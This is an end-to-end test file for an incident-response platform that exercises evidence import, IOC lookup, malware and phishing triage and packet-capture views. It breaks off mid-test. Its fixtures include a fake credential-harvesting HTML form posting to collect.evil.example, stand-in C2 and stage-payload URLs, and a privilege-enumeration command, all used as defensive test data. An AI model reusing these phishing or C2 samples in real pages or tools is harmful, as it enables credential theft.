import { readFileSync } from 'node:fs'
import { test, expect } from '@playwright/test'
import { buildSamplePe, phishingEml } from './helpers.js'

/*
 * Smoke test of the whole stack, as an analyst would use it on a fresh
 * install: create the first (admin) account, sign in, open an incident, drop
 * the evidence files of each tab (e2e/fixtures/) and check that the timeline
 * merges their events. One browser context is shared by the steps, in order.
 */

const ADMIN = { username: 'admin', password: 'supersecret' }

// No retries: the steps share one server and one account, so a retry from the
// first step can only fail ("first run" is over) and hide the real error.
test.describe.configure({ mode: 'serial', retries: 0 })

let page
// What the Content-Security-Policy blocked, if anything: the suite ends by checking it is empty.
const blocked = []

/** Drop a fixture file on the app, as from the file manager, and import it where Nik proposes. */
async function dropFixture(name) {
  const content = readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8')
  const transfer = await page.evaluateHandle(
    ([fileName, text]) => {
      const data = new DataTransfer()
      data.items.add(new File([text], fileName))
      return data
    },
    [name, content],
  )
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(dialog).toBeHidden()
}

test.beforeAll(async ({ browser }) => {
  page = await browser.newPage()
  page.on('pageerror', (error) => {
    throw new Error(`Uncaught error in the page: ${error.message}`)
  })
  page.on('console', (message) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(message.text())) blocked.push(message.text())
  })
})

test.afterAll(async () => {
  await page.close()
})

/** Open a kind of evidence of the incident on screen: the Evidence tab, then the kind in its list. */
async function openEvidence(kind) {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
  await page.getByRole('navigation', { name: 'Evidence' }).getByRole('button', { name: kind, exact: true }).click()
}

test('first run creates the admin account', async () => {
  await page.goto('/')
  await expect(page.getByText('first run')).toBeVisible()
  await page.fill('#setup-username', ADMIN.username)
  await page.fill('#setup-password', ADMIN.password)
  await page.fill('#setup-confirm', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.locator('#login-username')).toBeVisible()
})

test('the admin signs in and sees the empty dashboard', async () => {
  await page.fill('#login-username', ADMIN.username)
  await page.fill('#login-password', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.getByText('No active incident')).toBeVisible()
})

test('a new incident opens on its summary', async () => {
  await page.click('aside >> text=New incident')
  await page.fill('#new-host', 'WKS-FINANCE-01')
  await page.fill('#new-username', 'm.rossi')
  await page.click('button[type=submit]:has-text("Create incident")')
  await expect(page.getByText('Incident details')).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]')).toContainText('WKS-FINANCE-01')
})

test('the tab bar fits the window and every tab keeps its name', async () => {
  const nav = page.locator('nav[aria-label="Analysis tabs"]')
  const fits = () => nav.evaluate((element) => element.scrollWidth <= element.clientWidth + 1)
  const original = page.viewportSize()
  for (const width of [original.width, 1000]) {
    await page.setViewportSize({ width, height: original.height })
    // Shorter labels, then icons only: the bar never needs to scroll sideways.
    await expect.poll(fits).toBe(true)
    await expect(nav.getByRole('button', { name: 'Evidence', exact: true })).toBeVisible()
  }
  await page.setViewportSize(original)
  // Controls side by side share one height.
  const heights = await page
    .locator('header button, header div.border')
    .evaluateAll((elements) => [...new Set(elements.filter((e) => e.offsetHeight).map((e) => e.offsetHeight))])
  expect(heights).toEqual([36])
})

test('evidence files dropped on the app fill the analysis tabs', async () => {
  const current = page.locator('nav[aria-label="Evidence"] [aria-current="page"]')
  const files = [
    ['Bookmarks', 'Browser Forensics', /^Bookmarks/],
    ['bash_history', 'Command History'],
    ['bam-export.csv', 'Endpoint Artifacts'],
    ['nik-eventlogs.json', 'Event Logs'],
  ]
  for (const [name, tab, section] of files) {
    await dropFixture(name)
    await expect(current).toContainText(tab)
    if (section) {
      await page
        .getByRole('navigation', { name: 'Browser analysis sections' })
        .getByRole('button', { name: section })
        .click()
    }
    await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
  }
})

test('the timeline merges the events of every tab', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(page.locator('tbody tr').first()).toBeVisible()
  const counter = page.getByText(/of \d+ results/)
  await expect(counter).toBeVisible()
  expect(await counter.textContent()).not.toMatch(/of 0 results/)
  for (const source of ['Bash', 'Security']) {
    await expect(page.locator('tbody').getByText(source).first()).toBeVisible()
  }
})

test('the IOCs tab gathers the indicators and shows where they were seen', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const attacker = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(attacker).toBeVisible({ timeout: 20_000 })
  await attacker.click()
  const dialog = page.getByRole('dialog', { name: 'Indicator' })
  await expect(dialog.getByRole('region', { name: 'Seen in' })).toContainText('WKS-FINANCE-01')
  // Sources: keyless providers are ready; nothing is sent until asked.
  await expect(dialog.getByRole('button', { name: 'Check now' })).toBeVisible()
  await expect(dialog.getByRole('region', { name: 'Sources' })).toContainText('Not checked yet')
  await expect(dialog).toContainText('not checked')
  await page.keyboard.press('Escape')
  // Seen in another incident is a plain number now: only the verdict colours a row.
  await expect(page.getByRole('button', { name: /^Check all \d+$/ })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Save as a list' })).toBeVisible()
  await attacker.click()
  // The window becomes a page with its own address, and goes back to where it was opened.
  const before = new URL(page.url()).pathname
  await dialog.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  // The address alone opens the indicator (a shared link, a bookmark).
  await page.reload()
  await expect(page.getByRole('dialog', { name: 'Indicator' }).getByRole('region', { name: 'Seen in' })).toContainText(
    'WKS-FINANCE-01',
    { timeout: 20_000 },
  )
  await page.getByRole('dialog', { name: 'Indicator' }).getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
})

test('threat intelligence is configured in Settings, keys never shown', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Threat intelligence').click()
  const ips = settings.getByRole('switch', { name: /IP addresses/ })
  await expect(ips).not.toBeChecked()
  await ips.check()
  await expect(ips).toBeChecked()
  const virustotal = settings.getByRole('listitem').filter({ hasText: 'VirusTotal' }).first()
  await settings.getByLabel('VirusTotal API key', { exact: true }).fill('e2e-virustotal-key-0042')
  await virustotal.getByRole('button', { name: 'Add key' }).click()
  await expect(virustotal.getByText('key …0042')).toBeVisible()
  await expect(settings.getByLabel('VirusTotal API key', { exact: true })).toHaveValue('')
  // A second key, with a label: the lookups will go round the two.
  await settings.getByLabel('VirusTotal API key', { exact: true }).fill('e2e-virustotal-key-0043')
  await settings.getByLabel('Label of the VirusTotal key').fill('second account')
  await virustotal.getByRole('button', { name: 'Add key' }).click()
  await expect(virustotal.getByText('2 keys in rotation')).toBeVisible()
  const keys = settings.getByRole('list', { name: 'VirusTotal API keys' })
  await expect(keys.getByRole('listitem')).toHaveCount(2)
  await expect(keys).toContainText('second account')
  await expect(settings).not.toContainText('e2e-virustotal-key')
  await keys.getByRole('button', { name: 'Remove the VirusTotal key ending in 0043' }).click()
  await expect(keys.getByRole('listitem')).toHaveCount(1)
  // How long an answer stands, per type, and what VirusTotal is asked for.
  await expect(settings.getByLabel('File hashes: days an answer stands')).toHaveValue('180')
  await expect(settings.getByRole('switch', { name: /Ask again when an answer has expired/ })).toBeChecked()
  await expect(settings.getByLabel('VirusTotal vendors listed')).toHaveValue('flagged')
  await expect(settings.getByRole('switch', { name: /^Relations/ })).not.toBeChecked()
  await settings.getByLabel('IP addresses: days an answer stands').fill('45')
  await ips.uncheck()
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Threat intelligence').click()
  await expect(settings.getByLabel('IP addresses: days an answer stands')).toHaveValue('45')
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('right-click on an indicator adds it to the allowlist, with undo', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Indicators', exact: true }).click()
  const value = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(value).toBeVisible({ timeout: 20_000 })
  await value.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('Where else was this seen?')
  await menu.getByRole('menuitem', { name: 'Add to the allowlist…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Add to the allowlist' })
  await expect(dialog).toContainText('185.220.101.0/24')
  await dialog.getByRole('button', { name: 'Add to the allowlist' }).click()
  await expect(value).toBeHidden({ timeout: 10_000 })
  await page.getByRole('button', { name: 'Undo' }).click()
  await expect(value).toBeVisible({ timeout: 10_000 })
})

test('a file dropped anywhere goes to the right tab', async () => {
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['#1762500000\nwhoami /priv\n'], '.zsh_history', { type: 'text/plain' }))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('Shell history')
  await expect(dialog.getByLabel('Shell')).toHaveValue('zsh')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Command History')
  await expect(page.getByText('whoami /priv').first()).toBeVisible()
})

test('the search palette finds indicators and runs actions', async () => {
  await page.keyboard.press('ControlOrMeta+k')
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette).toBeVisible()
  await palette.getByRole('textbox', { name: 'Search' }).fill('185.220.101')
  await expect(palette.getByRole('option', { name: /185\.220\.101\.47/ }).first()).toBeVisible()
  // ">" lists actions: jump to the Timeline tab.
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expect(palette).toBeHidden()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Timeline')
})

test('the incident report is built by the server and previewed', async () => {
  await page.getByRole('button', { name: 'Incident report' }).click()
  const dialog = page.getByRole('dialog', { name: 'Incident report' })
  await dialog.getByRole('textbox').fill('Phishing e-mail, then a remote shell.')
  await dialog.getByRole('button', { name: 'Preview' }).click()
  const frame = page.frameLocator('iframe[title="Report preview"]')
  await expect(frame.getByRole('heading', { name: 'Incident report' })).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('Phishing e-mail, then a remote shell.')).toBeVisible()
  // By default the report lists only what was flagged: nothing yet.
  await expect(frame.getByText('what the analysts flagged')).toBeVisible()
  await expect(frame.getByText('Nothing was flagged here.').first()).toBeVisible()
  await expect(frame.getByText('185.220.101.47').first()).toBeHidden()
  // "Include everything" brings back the whole incident.
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).check()
  await dialog.getByRole('button', { name: 'Preview' }).click()
  await expect(frame.getByText('everything in the incident')).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('185.220.101.47').first()).toBeVisible()
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).uncheck()
  await page.keyboard.press('Escape')
})

test('a sample is stored, analysed and shown with its indicators', async () => {
  // With the real workers this test waits for rizin, two capa rule checks
  // (~10 s each) and a second capa run: more than the 60 s default.
  if (process.env.E2E_ANALYZER_URL || process.env.E2E_CAPA_URL) test.setTimeout(300_000)
  await openEvidence('Malware Analysis')
  await expect(page.getByText('No samples yet')).toBeVisible()
  await page.getByRole('button', { name: 'Upload malware samples' }).locator('input[type=file]').setInputFiles({
    name: 'invoice_0423.pdf.exe',
    mimeType: 'application/octet-stream',
    buffer: buildSamplePe(),
  })
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await expect(page.getByText('PE32 executable, Intel 80386').first()).toBeVisible()
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()

  // The Evidence tab: seven tabs on the bar, the kinds of evidence in one list at the side.
  const bar = page.locator('nav[aria-label="Analysis tabs"]')
  await expect(bar.getByRole('button')).toHaveCount(7)
  await expect(bar.locator('[aria-current="page"]')).toContainText('Evidence')
  const evidence = page.getByRole('navigation', { name: 'Evidence' })
  await expect(evidence.locator('[aria-current="page"]')).toContainText('Malware Analysis')
  // A file of the list opens alone, in the page of its kind: the list of that kind steps aside.
  const file = evidence.getByRole('list', { name: 'Files of Malware Analysis' }).getByRole('button')
  await expect(file).toHaveText(['invoice_0423.pdf.exe'])
  await file.click()
  await expect(file).toHaveAttribute('aria-current', 'page')
  await expect(page.getByRole('list', { name: 'Samples' })).toHaveCount(0)
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()
  // The list is searched by the name of a file and by the kind.
  const find = evidence.getByRole('searchbox', { name: 'Find a file of the incident' })
  await find.fill('invoice')
  await expect(evidence.getByRole('button', { name: 'Malware Analysis', exact: true })).toBeVisible()
  await expect(evidence.getByRole('button', { name: 'Command History', exact: true })).toHaveCount(0)
  await find.fill('nothing like this')
  await expect(evidence).toContainText('No file matches')
  await find.fill('')
  // The name of the kind opens the whole of it again, with its own list.
  await evidence.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await page.getByRole('tab', { name: /^IOC/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'gate.php' })).toBeVisible()
  await expect(page.getByText('process injection').first()).toBeVisible()
  // Structure (parsed by pefile) and YARA (built-in injection rule) views.
  await page.getByRole('tab', { name: 'Structure' }).click()
  await expect(page.getByText('windows gui')).toBeVisible()
  await expect(page.locator('tbody tr', { hasText: '.text' })).toBeVisible()
  await page.getByRole('tab', { name: /^YARA/ }).click()
  await expect(page.getByText('pe_process_injection_apis')).toBeVisible()
  // Code view: rizin in CI (analyzer container), "not configured" elsewhere.
  await page.getByRole('tab', { name: 'Code' }).click()
  if (process.env.E2E_ANALYZER_URL) {
    // Recognised code (here the entry stub, runtime) is hidden by default; the
    // helper uses the URL, so it is where to start.
    await expect(page.locator('tbody tr', { hasText: 'fcn.0040100f' })).toBeVisible({ timeout: 60_000 })
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toHaveCount(0)
    await expect(page.getByRole('region', { name: 'Start here' })).toContainText('gate.php')
    await page.getByLabel(/Hide recognised library code/).uncheck()
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toBeVisible()
    await page.getByRole('tab', { name: 'Control flow' }).click()
    const cfg = page.locator('svg[aria-label^="Control flow of entry0"]')
    await expect(cfg).toBeVisible({ timeout: 30_000 })
    await expect(cfg).toContainText('push')
    await expect(cfg.locator('g.cursor-pointer')).toHaveCount(3) // three basic blocks
    // Pseudo-C from rz-ghidra, decompiled by the analysis; the call to the helper is a
    // link that opens the helper's own pseudo-C.
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    const code = page.locator('pre', { hasText: 'entry0' })
    await expect(code).toContainText('void entry0(void)', { timeout: 30_000 })
    await expect(page.getByText('from the analysis')).toBeVisible()
    await code.getByRole('button', { name: 'fcn.0040100f' }).click()
    await expect(page.locator('pre', { hasText: 'fcn.0040100f(void)' })).toContainText('return 0;', {
      timeout: 60_000,
    })
    // Switching functions with a graph open: the new graph (no calls) must not be
    // drawn with the previous function's layout (one edge) while ELK recomputes.
    await page.getByRole('tab', { name: 'Call graph' }).click()
    const rows = page.locator('tbody tr')
    for (const name of ['entry0', 'fcn.0040100f', 'entry0', 'fcn.0040100f']) {
      await rows.filter({ hasText: name }).first().click()
      await expect(page.locator(`svg[aria-label^="Calls from ${name}"]`)).toBeVisible({ timeout: 30_000 })
    }
    // Rename the helper: the new name replaces rizin's in the list and in the caller's pseudo-C.
    await page.getByRole('button', { name: 'Rename / comment' }).click()
    await page.getByLabel(/^Name/).fill('send_beacon')
    await page.getByLabel('Comment', { exact: true }).fill('Loads the C2 URL')
    await page.getByRole('button', { name: 'Save' }).click()
    await expect(page.getByText('Loads the C2 URL')).toBeVisible()
    await expect(rows.filter({ hasText: 'send_beacon' })).toBeVisible()
    await rows.filter({ hasText: 'entry0' }).first().click()
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    await expect(page.locator('pre').getByRole('button', { name: 'send_beacon' })).toBeVisible({ timeout: 30_000 })
    // The IOC table links the URL to the function that uses it.
    await page.getByRole('tab', { name: /^IOC/ }).click()
    await page.locator('tbody tr', { hasText: 'gate.php' }).getByRole('button', { name: 'send_beacon' }).click()
    await expect(page.locator('svg[aria-label^="Calls from send_beacon"]')).toBeVisible({ timeout: 30_000 })
  } else {
    await expect(page.getByText('The analyzer worker is not configured.')).toBeVisible()
  }
  // Capabilities view: real capa in CI (capa container), "not configured" elsewhere.
  // The smoke sample is too small to match any capa rule.
  await page.getByRole('tab', { name: /^Capabilities/ }).click()
  if (process.env.E2E_CAPA_URL) {
    await expect(page.getByText('capa found no capabilities in this sample.')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('capa 10.0.0')).toBeVisible()
    // An admin capa rule: checked by the worker, matched after Re-analyse, marked custom.
    await page.getByRole('button', { name: 'Open platform settings' }).click()
    const settings = page.getByRole('region', { name: 'Settings' })
    await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('capa rules').click()
    await settings.getByRole('button', { name: 'Add rule' }).click()
    await settings
      .getByLabel('capa rule (YAML)')
      .fill(
        'rule:\n  meta:\n    name: reference team C2 gate\n    namespace: team/c2\n    authors:\n      - e2e\n' +
          '    scopes:\n      static: file\n      dynamic: file\n  features:\n    - string: /gate\\.php/\n',
      )
    await settings.getByRole('button', { name: 'Validate' }).click()
    await expect(settings.getByText('Valid: reference team C2 gate')).toBeVisible({ timeout: 60_000 })
    await settings.getByRole('button', { name: 'Save rule' }).click()
    await expect(settings.getByRole('button', { name: 'Delete reference team C2 gate' })).toBeVisible({
      timeout: 60_000,
    })
    await settings.getByRole('button', { name: 'Close settings' }).click()
    await page.getByRole('button', { name: 'Re-analyse' }).click()
    await page.getByRole('tab', { name: /^Capabilities/ }).click()
    const custom = page.locator('tbody tr', { hasText: 'reference team C2 gate' })
    await expect(custom).toBeVisible({ timeout: 120_000 })
    await expect(custom.getByText('custom', { exact: true })).toBeVisible()
  } else {
    await expect(page.getByText('The capa worker is not configured.')).toBeVisible()
  }
})

test('a reported e-mail is triaged: verdict, sandboxed body, attachment sent to Malware Analysis', async () => {
  const eml = phishingEml()
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'reported.eml', { type: 'message/rfc822' }))
    return data
  }, eml)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('E-mail (.eml)')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Evidence"] [aria-current="page"]')).toContainText('Mail Analysis')
  await expect(page.getByRole('list', { name: 'Messages' })).toContainText('Your account will be suspended', {
    timeout: 60_000,
  })
  await expect(page.getByText('the sender domain paypai.example imitates paypal')).toBeVisible()
  await expect(page.getByText(/^phishing · \d+$/)).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]').getByLabel('Holds e-mails')).toBeVisible()
  // The body is drawn in a frame that runs nothing and follows no link.
  await page.getByRole('tab', { name: 'Body' }).click()
  const frame = page.locator('iframe[title="Message body (sandboxed)"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(page.getByText('1 hidden')).toBeVisible()
  const body = page.frameLocator('iframe[title="Message body (sandboxed)"]')
  await expect(body.getByText('Verify your account immediately.')).toBeVisible()
  await expect(body.locator('script')).toHaveCount(0)
  await expect(body.locator('a[href]')).toHaveCount(0)
  await page.getByRole('tab', { name: /^Links/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'login-paypa1.top' })).toContainText('text ≠ target')
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  await expect(page.getByText('double extension .pdf.exe')).toBeVisible()
  await page.getByRole('button', { name: 'Hex' }).click()
  await expect(page.getByText('00000000  4d 5a 00 00')).toBeVisible()
  await page.getByRole('button', { name: 'Send to Malware Analysis' }).click()
  const toast = page.getByRole('status').filter({ hasText: 'invoice.pdf.exe is now a sample of this incident.' })
  await toast.getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice.pdf.exe')
})

test('attachments are previewed by the isolated workers', async () => {
  const pdf =
    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
  const html =
    '<html><head><title>Sign in</title></head><body>' +
    // Opens a second window, as a sign-in page does for its help or its identity provider.
    '<a target="_blank" href="?help=1" style="position:fixed;left:0;top:0;width:220px;height:44px">Help</a>' +
    '<form action="https://collect.evil.example/p">' +
    '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
  const eml = [
    'From: Billing <billing@invoices.example>',
    'To: m.rossi@contoso.example',
    'Subject: Statement and secure link',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b2"',
    '',
    '--b2',
    'Content-Type: text/plain',
    '',
    'See the attached statement.',
    '--b2',
    'Content-Type: application/pdf; name="statement.pdf"',
    'Content-Disposition: attachment; filename="statement.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(pdf).toString('base64'),
    '--b2',
    'Content-Type: text/html; name="secure.html"',
    'Content-Disposition: attachment; filename="secure.html"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(html).toString('base64'),
    '--b2--',
    '',
  ].join('\r\n')
  await openEvidence('Mail Analysis')
  await page
    .getByRole('button', { name: 'Upload e-mails' })
    .locator('input[type=file]')
    .setInputFiles({ name: 'statement.eml', mimeType: 'message/rfc822', buffer: Buffer.from(eml) })
  await page.getByRole('list', { name: 'Messages' }).getByText('Statement and secure link').click()
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  const preview = page.getByRole('button', { name: 'Preview' })
  const browse = page.getByRole('button', { name: 'Open in isolated browser' })
  if (process.env.E2E_DOCVIEW_URL) {
    await preview.click()
    await expect(page.getByRole('img', { name: 'Page 1 of statement.pdf' })).toBeVisible({ timeout: 60_000 })
    await page.keyboard.press('Escape')
  } else {
    await expect(preview).toBeDisabled()
  }
  if (process.env.E2E_BROWSER_URL) {
    await browse.click()
    await page
      .getByRole('dialog', { name: 'Open in the isolated browser' })
      .getByRole('button', { name: 'Open' })
      .click()
    const remote = page.getByRole('dialog', { name: /^Isolated browser/ })
    await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
    await expect(remote).toContainText('no network')
    await expect(remote).toContainText(/request(s)? refused/)
    // The page is drawn at the size of the space it has: one picture pixel per screen pixel.
    const picture = remote.getByRole('img', { name: /^Screenshot of/ })
    await expect
      .poll(() => picture.evaluate((img) => img.naturalWidth > 1000 && img.naturalWidth === img.clientWidth), {
        timeout: 20_000,
      })
      .toBe(true)
    await expect(remote.getByRole('button', { name: 'Full screen' })).toBeVisible()
    // A window the page opens is a tab of the session; closing it shows the first one again.
    const tabs = remote.getByRole('tablist', { name: 'Tabs of the session' })
    await expect(tabs).toHaveCount(0)
    await remote.getByRole('application', { name: /Remote page/ }).click({ position: { x: 30, y: 15 } })
    await expect(tabs.getByRole('tab')).toHaveCount(2, { timeout: 20_000 })
    await expect(tabs.getByRole('tab').nth(1)).toHaveAttribute('aria-selected', 'true')
    await tabs.getByRole('tab').first().click()
    await expect(tabs.getByRole('tab').first()).toHaveAttribute('aria-selected', 'true')
    await tabs
      .getByRole('button', { name: /^Close the tab/ })
      .nth(1)
      .click()
    await expect(tabs).toHaveCount(0)
    // The Network panel lists the refused requests (the page's image, its form target).
    await remote.getByRole('button', { name: /^Network/ }).click()
    // One per tab that loaded the page.
    await expect(remote.locator('tbody tr', { hasText: 'logo.png' }).first()).toContainText('blocked')
    await remote.getByRole('button', { name: 'Close' }).click()
    // The session becomes a capture of the incident.
    await openEvidence('Network Analysis')
    await expect(page.getByRole('list', { name: 'Captures' })).toContainText('attachment secure.html', {
      timeout: 30_000,
    })
  } else {
    await expect(browse).toBeDisabled()
  }
})

test('a packet capture opens as in Wireshark', async () => {
  await openEvidence('Network Analysis')
  await page
    .getByRole('button', { name: 'Upload packet captures' })
    .locator('input[type=file]')
    .setInputFiles('e2e/fixtures/phish.pcapng')
  await expect(page.getByRole('list', { name: 'Captures' })).toContainText('phish.pcapng')
  await page.getByRole('list', { name: 'Captures' }).getByText('phish.pcapng').click()
  if (!process.env.E2E_PCAP_URL) {
    await expect(page.getByText('stored, not analysed')).toBeVisible()
    return
  }
  const packets = page.getByRole('table', { name: 'Packets' })
  await expect(packets.locator('tbody tr').first()).toBeVisible({ timeout: 120_000 })
  // Column headers sort the loaded packets: by length, largest first on the second click.
  const lengths = async () =>
    (await packets.locator('tbody tr td:nth-child(6)').allTextContents()).map((text) => Number(text))
  await packets.getByRole('button', { name: 'Length' }).click()
  const ascending = await lengths()
  expect(ascending).toEqual([...ascending].sort((a, b) => a - b))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'descending')
  const descending = await lengths()
  expect(descending).toEqual([...descending].sort((a, b) => b - a))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'none')
  // A Wireshark display filter, then the packet's tree and its bytes.
  await page.getByLabel('Display filter').fill('http.request.method == "POST"')
  await page.getByRole('button', { name: 'Apply', exact: true }).click()
  await expect(packets.locator('tbody tr')).toHaveCount(1)
  await packets.locator('tbody tr').first().click()
  const tree = page.getByRole('tree', { name: 'Packet details' })
  await expect(tree).toContainText('Hypertext Transfer Protocol')
  // Public addresses in the packet's details are indicators: a click opens their window.
  const address = tree.getByRole('button', { name: /^(203\.0\.113|198\.51\.100)\.\d+$/ }).first()
  await expect(address).toBeVisible()
  await address.click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(tree.getByRole('button', { name: /^10\.\d+\.\d+\.\d+$/ })).toHaveCount(0)
  await tree.getByText('Hypertext Transfer Protocol').click()
  await expect(page.getByLabel('Packet bytes').locator('.bg-accent').first()).toBeVisible()
  // Follow the HTTP stream: the credentials in clear.
  await page.getByRole('button', { name: /^Follow HTTP stream/ }).click()
  await expect(page.getByLabel('Stream content')).toContainText('pass=Winter2026')
  await page.keyboard.press('Escape')
  // Export Objects and the summary.
  await page.getByRole('tab', { name: 'Objects' }).click()
  await expect(page.locator('tbody tr', { hasText: 'invoice.exe' })).toBeVisible()
  await page.getByRole('tab', { name: 'Summary' }).click()
  await expect(page.getByText('6 connections every 30 s')).toBeVisible()
})

test('a file is analysed on its own, tagged, then linked to the incident', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  await page
    .getByRole('dialog', { name: 'New analysis' })
    .locator('input[type=file]')
    .setInputFiles({
      name: 'dropper.bin',
      mimeType: 'application/octet-stream',
      buffer: Buffer.from('MZ analysed on its own http://198.51.100.9/stage.bin'),
    })
  // Nik asks where it goes, with "Start analysis" chosen.
  const place = page.getByRole('dialog', { name: 'Add a file' })
  await expect(place.getByRole('radio', { name: /^Start analysis/ })).toBeChecked()
  await place.getByRole('button', { name: 'Start analysis' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible({ timeout: 30_000 })
  await expect(artifact).toContainText('Not linked to an incident.')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  // The same analysis views as in an incident, without the incident-only actions.
  await expect(page.getByRole('button', { name: 'Download zip' })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Remove', exact: true })).toHaveCount(0)

  await artifact.getByRole('button', { name: 'Add tags' }).click()
  await artifact.getByLabel('Tags').fill('Emotet campaign:q4')
  await artifact.getByRole('button', { name: 'Save' }).click()
  await expect(artifact).toContainText('#emotet')
  await panel.getByLabel('Filter artifacts').fill('campaign')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await panel.getByLabel('Filter artifacts').fill('')

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  const linked = artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true })
  await expect(linked).toBeVisible()
  // The incident now holds the sample.
  await linked.click()
  await openEvidence('Malware Analysis')
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('dropper.bin', { timeout: 20_000 })

  // Dropped again, the file is recognised as already analysed.
